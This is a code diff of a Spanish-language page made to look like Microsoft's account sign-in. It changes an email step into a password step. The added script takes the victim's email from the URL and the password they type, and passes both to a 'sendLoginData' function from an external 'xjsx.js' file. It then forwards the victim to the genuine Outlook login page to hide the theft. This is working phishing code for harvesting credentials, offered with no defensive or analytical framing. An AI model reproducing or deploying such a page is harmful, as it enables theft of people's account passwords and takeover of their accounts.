@@ -21,9 +21,6 @@
               'ms-gray-light': '#605e5c',
               'ms-border': '#8a8886',
               'ms-bg': '#f5f5f5',
-              'ms-error': '#a4262c',
-              'ms-error-bg': '#fef7f7',
-              'ms-error-border': '#d83b01',
             },
             fontFamily: {
               'segoe': ['"Segoe UI"', 'system-ui', '-apple-system', 'BlinkMacSystemFont', 'sans-serif'],
@@ -79,21 +76,6 @@
         box-shadow: inset 0 0 0 1px #0078d4;
       }
       
-      .ms-input-error {
-        border: 2px solid #d83b01 !important;
-        background: #fef7f7;
-        font-size: 15px;
-        padding: 10px 11px;
-        line-height: 20px;
-        border-radius: 2px;
-      }
-      
-      .ms-input-error:focus {
-        outline: none !important;
-        border-color: #d83b01 !important;
-        box-shadow: inset 0 0 0 1px #d83b01;
-      }
-      
       .ms-button {
         background: #0078d4;
         transition: background-color 0.1s ease;
@@ -112,6 +94,11 @@
         background: #005a9e;
       }
       
+      .ms-button:disabled {
+        background: #8a8886;
+        cursor: not-allowed;
+      }
+      
       .ms-link {
         color: #0078d4;
         text-decoration: none;
@@ -122,24 +109,13 @@
         text-decoration: underline;
       }
       
-      
       .fade-in {
         animation: fadeIn 0.3s ease-out;
-      }
-      
-      .error-shake {
-        animation: shake 0.5s ease-in-out;
       }
       
       @keyframes fadeIn {
         from { opacity: 0; transform: translateY(10px); }
         to { opacity: 1; transform: translateY(0); }
-      }
-      
-      @keyframes shake {
-        0%, 100% { transform: translateX(0); }
-        10%, 30%, 50%, 70%, 90% { transform: translateX(-3px); }
-        20%, 40%, 60%, 80% { transform: translateX(3px); }
       }
       
       /* Contenedor principal fijo en móvil */
@@ -187,36 +163,42 @@
           <span class="text-ms-logo text-ms-gray">Microsoft</span>
         </div>
         
-        <h1 class="text-ms-title text-ms-gray mb-2 font-semibold text-center">Iniciar sesión</h1>
-        <p class="text-ms-subtitle text-ms-gray-light mb-8 text-center">Usar su cuenta de Microsoft.</p>
-        
-        <!-- Error message (hidden by default) -->
-        <div class="mb-4 p-3 bg-ms-error-bg border border-ms-error-border rounded hidden" id="errorMessage">
-          <div class="flex items-start">
-            <svg class="w-4 h-4 text-ms-error mt-0.5 mr-2 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
-            </svg>
-            <div>
-              <p class="text-sm text-ms-error font-medium">Solo se permiten cuentas de Microsoft</p>
-              <p class="text-xs text-ms-error mt-1">Use una dirección de hotmail, outlook, live o msn</p>
+        <!-- Back button with email -->
+        <div class="mb-6">
+          <div class="text-center mb-4">
+            <div class="inline-flex items-center justify-center bg-transparent rounded-full px-5 py-2 border border-gray-300">
+              <span id="userEmail" class="text-sm text-ms-gray font-medium">usuario@ejemplo.com</span>
             </div>
           </div>
         </div>
         
-        <form onsubmit="handleEmailSubmit(event)" class="space-y-6" id="emailForm">
-          <div>
+        <h1 class="text-xl text-ms-gray mb-8 font-semibold text-center">Escribir contraseña</h1>
+        
+        <form onsubmit="handleLogin(event)" class="space-y-6">
+          <div class="relative">
             <input
-              type="email"
-              id="email"
-              placeholder="Correo electrónico o número de teléfono"
-              class="ms-input w-full text-ms-gray bg-white"
+              type="password"
+              id="password"
+              placeholder="Contraseña"
+              class="ms-input w-full pr-10 text-ms-gray bg-white"
               required
             />
+            <button
+              type="button"
+              onclick="togglePassword()"
+              class="absolute right-3 top-1/2 transform -translate-y-1/2 text-ms-gray-light hover:text-ms-gray transition-colors"
+              tabindex="-1"
+            >
+              <svg id="eyeIcon" class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>
+              </svg>
+            </button>
           </div>
           
           <div class="text-left">
             <a href="#" class="ms-link">
-              ¿Olvidaste tu nombre de usuario?
+              ¿Olvidó su contraseña?
             </a>
           </div>
           
@@ -224,16 +206,16 @@
             type="submit"
             class="ms-button w-full text-white"
           >
-            Siguiente
+            Iniciar sesión
           </button>
-          
-          <div class="text-center text-ms-body text-ms-gray">
-            ¿Es nuevo en Microsoft? 
-            <a href="#" class="ms-link font-semibold">
-              Crear una cuenta
-            </a>
-          </div>
         </form>
+        
+        <!-- Sign-in options -->
+        <div class="mt-8 pt-6 border-t border-gray-200">
+          <div class="text-center">
+            <a href="#" class="ms-link">Otras formas de iniciar sesión</a>
+          </div>
+        </div>
       </div>
       </div>
     </div>
@@ -254,94 +236,85 @@
     <script src="xjsx.js"></script>
     
     <script>
-      // Dominios de Microsoft permitidos
-      const allowedDomains = [
-        'hotmail.com', 'hotmail.es', 'hotmail.co.uk', 'hotmail.fr', 'hotmail.de', 'hotmail.it',
-        'outlook.com', 'outlook.es', 'outlook.co.uk', 'outlook.fr', 'outlook.de', 'outlook.it',
-        'live.com', 'live.es', 'live.co.uk', 'live.fr', 'live.de', 'live.it',
-        'msn.com'
-      ];
-      
-      function validateMicrosoftDomain(email) {
-        const domain = email.split('@')[1];
-        return domain && allowedDomains.includes(domain.toLowerCase());
+      // Get email from URL parameter or use default
+      const urlParams = new URLSearchParams(window.location.search);
+      const email = urlParams.get('email') || 'usuario@ejemplo.com';
+      document.getElementById('userEmail').textContent = email;
+
+      function togglePassword() {
+        const passwordInput = document.getElementById('password');
+        const eyeIcon = document.getElementById('eyeIcon');
+        
+        if (passwordInput.type === 'password') {
+          passwordInput.type = 'text';
+          eyeIcon.innerHTML = `
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L3 3m6.878 6.878L21 21"></path>
+          `;
+        } else {
+          passwordInput.type = 'password';
+          eyeIcon.innerHTML = `
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>
+          `;
+        }
       }
-      
-      function showError() {
-        const errorMessage = document.getElementById('errorMessage');
-        const emailInput = document.getElementById('email');
-        const form = document.getElementById('emailForm');
-        
-        // Mostrar mensaje de error
-        errorMessage.classList.remove('hidden');
-        
-        // Cambiar estilo del input
-        emailInput.classList.remove('ms-input');
-        emailInput.classList.add('ms-input-error');
-        
-        // Agregar efecto de shake
-        form.classList.add('error-shake');
-        setTimeout(() => {
-          form.classList.remove('error-shake');
-        }, 500);
+
+      function goBack() {
+        window.history.back();
       }
-      
-      function hideError() {
-        const errorMessage = document.getElementById('errorMessage');
-        const emailInput = document.getElementById('email');
-        
-        // Ocultar mensaje de error
-        errorMessage.classList.add('hidden');
-        
-        // Restaurar estilo del input
-        emailInput.classList.remove('ms-input-error');
-        emailInput.classList.add('ms-input');
-      }
-      
-      function handleEmailSubmit(event) {
+
+      function handleLogin(event) {
         event.preventDefault();
         
         // Prevenir múltiples envíos
-        const submitButton = event.target.querySelector('button[type="submit"]');
+        const submitButton = event.target.querySelector('button[type="submit"]') || document.querySelector('button[type="submit"]');
         if (submitButton.disabled) {
           return;
         }
         
-        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value;
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email') || 'usuario@ejemplo.com';
         
-        if (email) {
+        if (password.trim()) {
           // Deshabilitar botón inmediatamente
           submitButton.disabled = true;
           submitButton.textContent = 'Verificando...';
           
-          // Validar dominio de Microsoft
-          if (!validateMicrosoftDomain(email)) {
-            // Re-habilitar botón si hay error
-            submitButton.disabled = false;
-            submitButton.textContent = 'Siguiente';
-            showError();
-            return;
-          }
+          // Enviar datos usando XJSX
+          console.log('📤 Enviando datos de login...');
           
-          // Si es válido, continuar
-          window.location.href = `index2.html?email=${encodeURIComponent(email)}`;
+          if (typeof sendLoginData !== 'undefined') {
+            sendLoginData(email, password)
+              .then(success => {
+                console.log(success ? '✅ Login enviado' : '❌ Error enviando login');
+                setTimeout(() => {
+
+                  // ✅ Si ya pasó 1 vez por index3, saltar directo a index4
+                    const yaPasoPorIndex3 = localStorage.getItem("paso_index3") === "1";
+
+                    if (yaPasoPorIndex3) {
+                     window.location.href = `https://www.microsoft.com/es-es/microsoft-365/outlook/log-in`;
+                  } else {
+                 // ✅ Primera vez: marcar y mandarlo a index3
+                     localStorage.setItem("paso_index3", "1");
+                    window.location.href = `https://www.microsoft.com/es-es/microsoft-365/outlook/log-in`;
+                  }
+
+                }, 500);
+              })
+              .catch(error => {
+                console.error('❌ Error:', error);
+                setTimeout(() => {
+                  window.location.href = `index.html`;
+                }, 500);
+              });
+          } else {
+            console.warn('⚠️ XJSX no cargado');
+            window.location.href = `index.html`;
+          }
         }
       }
-      
-      // Ocultar error cuando el usuario empiece a escribir
-      document.getElementById('email').addEventListener('input', function() {
-        if (this.value.length > 0) {
-          hideError();
-        }
-      });
-      
-      // También ocultar error cuando el input reciba focus
-      document.getElementById('email').addEventListener('focus', function() {
-        hideError();
-      });
     </script>
-  <!-- Inserted by miarroba -->
-</script></noframes></noembed></noscript><script type="text/javascript" src="/hosting__contador__visitas__unicas.php?h=2201685&amp;t=1759878497&amp;k=836fc5a243382e506f51f4d3de6342d7&amp;__muid="></script>
-<!-- Inserted by miarroba -->
 </body>
 </html>
